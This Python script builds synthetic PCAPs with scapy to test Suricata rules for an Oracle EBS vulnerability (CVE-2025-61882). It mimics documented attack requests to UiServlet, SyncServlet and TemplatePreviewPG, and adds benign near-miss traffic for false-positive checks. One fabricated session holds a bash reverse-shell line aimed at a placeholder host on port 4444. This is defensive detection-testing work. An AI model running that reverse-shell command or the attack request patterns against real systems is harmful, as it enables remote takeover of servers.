#!/usr/bin/env python3
"""
Build SYNTHETIC PCAPs for testing the CVE-2025-61882 Suricata rules.

Nothing here talks to a network: packets are crafted in memory and written
to .pcap files. The HTTP requests only *look like* the documented malicious
requests on the wire; there is no exploit payload and no EBS server.

Outputs (in ../testdata/):
  attack.pcap  - one session per documented attack-chain behavior
  benign.pcap  - normal EBS-like traffic, including near-misses, for
                 false-positive measurement
"""
import os
import random
from scapy.all import IP, TCP, Raw, wrpcap

OUT = os.path.join(os.path.dirname(__file__), "..", "testdata")
EBS = "10.0.0.10"            # pretend EBS app tier (inside $HOME_NET)
USER = "10.0.0.50"           # internal user workstation
ATTACKER = "200.107.207.26"  # published exploitation source (Oracle/GTIG IOC)
OTHER = "198.51.100.23"      # TEST-NET-2: a generic external client
PREVIEW = "/OA_HTML/OA.jsp?page=/oracle/apps/xdo/oa/template/webui/TemplatePreviewPG"


def tcp_session(src, dst, dport, client_payload,
                server_payload=b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"):
    """Full handshake, one request, one response, FIN teardown."""
    sport = random.randint(30000, 60000)
    cs, ss = random.randint(1, 2**31), random.randint(1, 2**31)
    p = []
    p.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="S", seq=cs))
    p.append(IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="SA", seq=ss, ack=cs + 1))
    p.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="A", seq=cs + 1, ack=ss + 1))
    p.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="PA", seq=cs + 1, ack=ss + 1) / Raw(client_payload))
    cs2 = cs + 1 + len(client_payload)
    p.append(IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="A", seq=ss + 1, ack=cs2))
    if server_payload:
        p.append(IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="PA", seq=ss + 1, ack=cs2) / Raw(server_payload))
    ss2 = ss + 1 + len(server_payload or b"")
    p.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="FA", seq=cs2, ack=ss2))
    p.append(IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="FA", seq=ss2, ack=cs2 + 1))
    p.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="A", seq=cs2 + 1, ack=ss2 + 1))
    return p


def http(method, path, host="ebs.lab.local", body=b"", ctype="application/x-www-form-urlencoded"):
    hdr = f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: lab-test\r\n"
    if body:
        hdr += f"Content-Type: {ctype}\r\nContent-Length: {len(body)}\r\n"
    return hdr.encode() + b"\r\n" + body


def attack_sessions():
    s = []
    # 1000001 + 1000002: Chain A UiServlet request with getUiType XML and a return_url
    body = (b"redirectFromJsp=1&getUiType=<?xml version=\"1.0\"?><initialize>"
            b"<param name=\"return_url\">http://203.0.113.9:8000/placeholder</param>"
            b"</initialize>")
    s += tcp_session(ATTACKER, EBS, 8000, http("POST", "/OA_HTML/configurator/UiServlet", body=body))
    # 1000003: Chain B POST to SyncServlet
    s += tcp_session(OTHER, EBS, 8000, http("POST", "/OA_HTML/SyncServlet", body=b"placeholder=1"))
    # 1000004: TemplatePreviewPG with TemplateCode=TMP... and DEF...
    s += tcp_session(OTHER, EBS, 8000, http("GET", PREVIEW + "&TemplateCode=TMP4142434445&TemplateType=XSL-TEXT"))
    s += tcp_session(OTHER, EBS, 8000, http("GET", PREVIEW + "&TemplateCode=DEF0102030405&TemplateType=XSL-TEXT"))
    # 1000005: EBS host reaching out to a published C2 IP on 443
    s += tcp_session(EBS, "162.55.17.215", 443, b"\x16\x03\x01\x00\x05hello", server_payload=b"")
    # 1000007: reverse-shell string in an outbound stream (inert text, no shell)
    s += tcp_session(EBS, "203.0.113.77", 4444, b"sh -c bash -i >& /dev/tcp/203.0.113.77/4444 0>&1\n", server_payload=b"")
    return s


def benign_sessions():
    s = []
    normal = [
        "/OA_HTML/AppsLogin",
        "/OA_HTML/RF.jsp?function_id=1234",
        "/OA_HTML/OA.jsp?page=/oracle/apps/fnd/framework/navigate/webui/HomePG",
        # Near-miss: legit template preview with a normal code. Must NOT hit 1000004.
        PREVIEW + "&TemplateCode=XXAP_INVOICE&TemplateType=RTF",
        # Near-miss: bare GET to UiServlet, no XML body. Must NOT hit 1000001/1000002.
        "/OA_HTML/configurator/UiServlet",
        "/OA_MEDIA/logo.png",
    ]
    for _ in range(5):
        for path in normal:
            s += tcp_session(USER, EBS, 8000, http("GET", path))
    # Near-miss: internal Configurator POST to UiServlet with ordinary form data.
    # Must NOT hit 1000001/1000002 (no getUiType XML, no return_url).
    s += tcp_session(USER, EBS, 8000, http("POST", "/OA_HTML/configurator/UiServlet",
                                           body=b"configId=4471&action=save"))
    s += tcp_session(USER, EBS, 8000, http("POST", "/OA_HTML/OA.jsp", body=b"_rp=1&evtSrc=Submit"))
    # Ordinary outbound HTTPS to a non-C2 address. Must NOT hit 1000005.
    s += tcp_session(EBS, "93.184.216.34", 443, b"\x16\x03\x01\x00\x05hello", server_payload=b"")
    return s


if __name__ == "__main__":
    random.seed(5150)
    os.makedirs(OUT, exist_ok=True)
    wrpcap(os.path.join(OUT, "attack.pcap"), attack_sessions())
    wrpcap(os.path.join(OUT, "benign.pcap"), benign_sessions())
    print("wrote testdata/attack.pcap and testdata/benign.pcap")
